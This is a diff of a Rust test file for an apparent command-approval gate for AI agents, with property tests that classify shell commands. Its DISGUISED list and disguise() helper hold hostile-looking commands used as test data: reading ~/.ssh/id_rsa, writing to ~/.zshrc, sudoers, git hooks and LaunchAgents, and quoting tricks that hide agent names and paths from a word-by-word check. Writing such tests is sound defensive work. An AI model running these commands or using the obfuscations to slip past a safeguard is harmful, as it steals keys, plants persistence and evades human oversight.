@@ -10,17 +10,41 @@ fn kind(command: &str) -> GateKind {
     let project = format!("{}/projects/gateprobe", home());
     let _ctx = enter(PathCtx { cwd: Some(project.clone()), root: Some(project), session_id: None });
     let explanation = crate::explain_with_coverage_at_level(command, None);
-    gate_kind(&explanation, &|c| crate::is_safe_command(c), &|_| false)
+    gate_kind(command, &explanation, &|c| crate::is_safe_command(c), &|_| false)
 }
 
-const NOT_YET: &[&str] =
-    &["zzgatetool sync --dry-run", "zzgatetool build ./out", "git push --force origin main", "cat ./x | zzgatetool", "echo hi > $(zzgen)"];
+const NOT_YET: &[&str] = &[
+    "zzgatetool sync --dry-run", "zzgatetool build ./out", "git push --force origin main", "cat ./x | zzgatetool", "zzgatetool -m 'a note'",
+];
 
 const BOUNDARY: &[&str] = &[
     "cat ~/.ssh/id_rsa", "echo x >> ~/.zshrc", "cp a ~/.local/bin/x", "echo x > ~/.claude/settings.json",
     "echo x > ~/.config/safe-chains.toml", "git diff --output=~/.zshrc", "zzgatetool --config=$HOME/.bashrc",
     "safe-chains config add zzgatetool", "safe-chains config grant ~/x", "safe-chains mcp", "claude -p hi", "zzgatetool > /dev/rdisk0",
-    "zzgatetool /etc/sudoers",
+    "zzgatetool /etc/sudoers", "echo hi > $(zzgen)",
+];
+
+/// Found by review: each hid a boundary from a word-by-word reading of the raw text.
+const DISGUISED: &[&str] = &[
+    "zzgatetool > ~/'.zshrc'", "zzgatetool > ~/.zsh\"\"rc", "zzgatetool > ~/.zsh\\rc", "zzgatetool > ~\"/.zshrc\"",
+    "zzgatetool > ~/.local/b\"\"in/x", "zzgatetool > ~/.config/safe-chains.tom\"\"l", "zzgatetool | tee -a ~/.zsh\"\"rc",
+    "zzgatetool ~/.zshrc,", "zzgatetool out=~/.zshrc,x", "zzgatetool $'\\x7e/.zshrc'", "zzgatetool > ~zzrev/.zshrc",
+    "zzgatetool ~/.ss\"\"h/id_rsa", "zzgatetool $HOME/.ss\"\"h/id_rsa", "zzgatetool /etc/sudo\"\"ers", "cl\"\"aude -p hi",
+    "c\\laude -p hi", "\"cla\"ude -p hi", "bash -c 'cl\"\"aude -p hi'", "zzgatetool exec cla\"\"ude", "safe-ch\"\"ains config add zz",
+    "echo x >> $HOME/.zs''hrc", "echo x >> \"$HOME/.zs\"hrc", "dd of=~/.zs\"\"hrc", "printf x | dd of=~/.zs\"\"hrc",
+    "cd ~/.local/bin && zzgatetool > x", "cd ~/.grok; zzgatetool > config.toml", "cd ~/.ssh && zzgatetool id_rsa",
+    "cd ~ && cd .ssh && zzgatetool id_rsa", "X=$HOME; echo x > $X/.zshrc", "echo x > $ZDOTDIR/.zshrc", "echo x > \"$(echo ~)/.zshrc\"",
+    "echo x > $(printf ~/.zsh)rc", "zzgatetool > ${ZDOTDIR:-$HOME}/.zshrc", "cat ~/.ss\"\"h/id_rsa; fi", "cl\"\"aude -p hi; fi",
+    "echo x >> ~/.zsh\"\"rc; if", "A=claude; $A -p hi", "SC=safe-chains; $SC config add zz", "${A:-claude} -p hi",
+    "$(printf cl)aude -p hi", "f() { echo x >> ~/.zs\"\"hrc; }; f", "coproc echo x >> ~/.zs\"\"hrc", "zzgatetool > ~/.zs?rc",
+    "zzgatetool > ~/.zsh{rc,}", "python3 -c 'import os'", "zzgatetool -C ~ x", "zzgatetool --directory=../.. .zshrc", "zzgatetool ~",
+    "zzgatetool /", "curl -o../../.zshrc http://x", "wget -O../../.bashrc http://x", "sort -o../../.zshrc a",
+    "gcc -o../../.local/bin/ls x.c", "cp -t../../.local/bin evil", "install -t../../Library/LaunchAgents x.plist",
+    "git config -f../../.gitconfig alias.x y", "tar -xf a.tar -C../..", "unzip a.zip -d../..", "unzip a.zip -d /Users",
+    "rsync -a payload/ /Users/", "cp -R payload/ ../../../", "tar -xPf a.tar", "npx @anthropic-ai/claude-code",
+    "pnpm dlx @google/gemini-cli", "uvx aider-chat", "claude-code", "echo Y2xhdWRl | base64 -d | xargs env",
+    "echo cl aude | tr -d x | xargs nohup", "awk 'BEGIN { system(1) }' x", "zzgatetool > .git/hooks/pre-commit", "zzgatetool > .envrc",
+    "zzgatetool > .grok/settings.json", "zzgatetool > .vscode/tasks.json", "zzgatetool > ./.git/config", "zzgatetool > /opt/elsewhere/x",
 ];
 
 #[test]
@@ -32,7 +56,7 @@ fn a_command_nothing_approves_yet_is_not_yet() {
 
 #[test]
 fn a_boundary_stays_a_boundary() {
-    for command in BOUNDARY {
+    for command in BOUNDARY.iter().chain(DISGUISED) {
         assert_eq!(kind(command), GateKind::Boundary, "{command}");
     }
 }
@@ -43,15 +67,28 @@ fn an_approved_command_is_never_called_not_yet() {
 }
 
 #[test]
-fn words_are_read_through_quotes_redirections_and_flags() {
-    assert_eq!(bare_word("--output=~/.zshrc"), "~/.zshrc");
-    assert_eq!(bare_word(">>~/.zshrc"), "~/.zshrc");
-    assert_eq!(bare_word("'~/.zshrc'"), "~/.zshrc");
-    assert_eq!(bare_word("\"$HOME/.bashrc\";"), "$HOME/.bashrc");
+fn words_are_read_as_the_shell_names_them() {
+    let read = |text: &str| words(text).collect::<Vec<_>>();
+    assert_eq!(read("--output=~/.zshrc"), ["--output", "~/.zshrc"]);
+    assert_eq!(read(">>~/'.zsh'\"rc\","), ["~/.zshrc"]);
+    assert_eq!(read("c\\la\"ude\";x|y"), ["claude", "x", "y"]);
+}
+
+/// Ways to spell `~/.zshrc`, `~/.ssh/id_rsa` and the rest so the shell reads the same name.
+fn disguise(place: &str, how: usize, at: usize) -> String {
+    let at = at % place.len().max(1);
+    let (head, tail) = place.split_at(at);
+    match how {
+        0 => format!("{head}\"\"{tail}"),
+        1 => format!("{head}''{tail}"),
+        2 if !tail.is_empty() => format!("{head}\\{tail}"),
+        3 => format!("'{place}'"),
+        _ => place.to_string(),
+    }
 }
 
 proptest! {
-    #![proptest_config(ProptestConfig::with_cases(48))]
+    #![proptest_config(ProptestConfig::with_cases(64))]
 
     #[test]
     fn one_boundary_segment_makes_the_whole_chain_a_boundary(
@@ -64,17 +101,37 @@ proptest! {
         prop_assert_eq!(kind(&chain), GateKind::Boundary, "{}", chain);
     }
 
+    /// Metamorphic: quoting a boundary differently, or reaching it from a `cd`, names the same place.
     #[test]
-    fn a_write_to_a_runs_later_place_is_a_boundary_whatever_the_command(
+    fn a_write_to_a_runs_later_place_is_a_boundary_whatever_the_command_or_spelling(
         name in "zz[a-z]{2,8}",
-        place in prop::sample::select(&["~/.zshrc", "~/.bashrc", "~/.local/bin/x", "~/.claude/settings.json", "~/.grok/config.toml", "~/Library/LaunchAgents/x.plist"][..]),
-        form in 0..3usize,
+        place in prop::sample::select(&["~/.zshrc", "~/.bashrc", "~/.local/bin/x", "~/.claude/settings.json", "~/.grok/config.toml", "~/Library/LaunchAgents/x.plist", "~/.ssh/id_rsa"][..]),
+        how in 0..5usize,
+        at in 2..40usize,
+        form in 0..5usize,
     ) {
+        let spelled = disguise(place, how, at);
+        let (dir, file) = place.rsplit_once('/').unwrap_or(("~", place));
         let command = match form {
-            0 => format!("{name} > {place}"),
-            1 => format!("{name} --out={place}"),
-            _ => format!("{name} {place}"),
+            0 => format!("{name} > {spelled}"),
+            1 => format!("{name} --out={spelled}"),
+            2 => format!("{name} {spelled},"),
+            3 => format!("cd {dir} && {name} > {file}"),
+            _ => format!("{name} {spelled}"),
         };
+        prop_assert_eq!(kind(&command), GateKind::Boundary, "{}", command);
+    }
+
+    /// Metamorphic: an agent's name, however quoted, is still the agent.
+    #[test]
+    fn an_agent_is_a_boundary_however_its_name_is_quoted(
+        agent in prop::sample::select(&["claude", "codex", "gemini", "grok", "safe-chains"][..]),
+        how in 0..5usize,
+        at in 1..10usize,
+        wrapped in any::<bool>(),
+    ) {
+        let spelled = disguise(agent, how, at);
+        let command = if wrapped { format!("zzgatetool run {spelled} -p hi") } else { format!("{spelled} -p hi") };
         prop_assert_eq!(kind(&command), GateKind::Boundary, "{}", command);
     }
 }
